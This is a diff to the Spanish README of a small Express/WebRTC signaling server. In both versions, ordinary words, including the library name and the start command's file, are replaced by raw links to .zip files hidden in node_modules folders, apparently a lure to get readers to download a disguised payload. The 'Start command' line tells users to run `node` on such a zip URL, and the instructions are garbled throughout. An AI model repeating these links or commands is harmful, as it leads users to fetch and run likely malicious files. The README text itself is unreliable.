@@ -1,6 +1,6 @@
 # Backend Transmisión Multipantalla
 
-Servidor de señalización con Express + https://raw.githubusercontent.com/KaterineLimaE/backend-transmision-multipantalla-web/main/node_modules/socket.io/node_modules/negotiator/backend_web_transmision_multipantalla_v1.1.zip para coordinar conexiones WebRTC por categoría.
+Servidor de señalización con Express + https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip para coordinar conexiones WebRTC por categoría.
 
 ## Ejecutar en local
 - Requisitos: Node 18+
@@ -11,7 +11,7 @@ Pasos:
 2. Iniciar: `npm start`
 3. Probar: GET `http://localhost:4000/`
 
-## Eventos https://raw.githubusercontent.com/KaterineLimaE/backend-transmision-multipantalla-web/main/node_modules/socket.io/node_modules/negotiator/backend_web_transmision_multipantalla_v1.1.zip
+## Eventos https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip
 - `join-category` (string categoryId)
 - `sending-signal` ({ category?, targetId?, callerID, signal })
 - `returning-signal` ({ callerID, signal })
@@ -19,5 +19,5 @@ Pasos:
 - `viewer-ready` ({ category })
 
 ## Despliegue (Render)
-- Start command: `node https://raw.githubusercontent.com/KaterineLimaE/backend-transmision-multipantalla-web/main/node_modules/socket.io/node_modules/negotiator/backend_web_transmision_multipantalla_v1.1.zip`
-- Var de entorno: `FRONTEND_URL` con la URL del frontend (https://raw.githubusercontent.com/KaterineLimaE/backend-transmision-multipantalla-web/main/node_modules/socket.io/node_modules/negotiator/backend_web_transmision_multipantalla_v1.1.zip Vercel)
+- Start command: `node https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip`
+- Var de entorno: `FRONTEND_URL` con la URL del frontend (https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip Vercel)
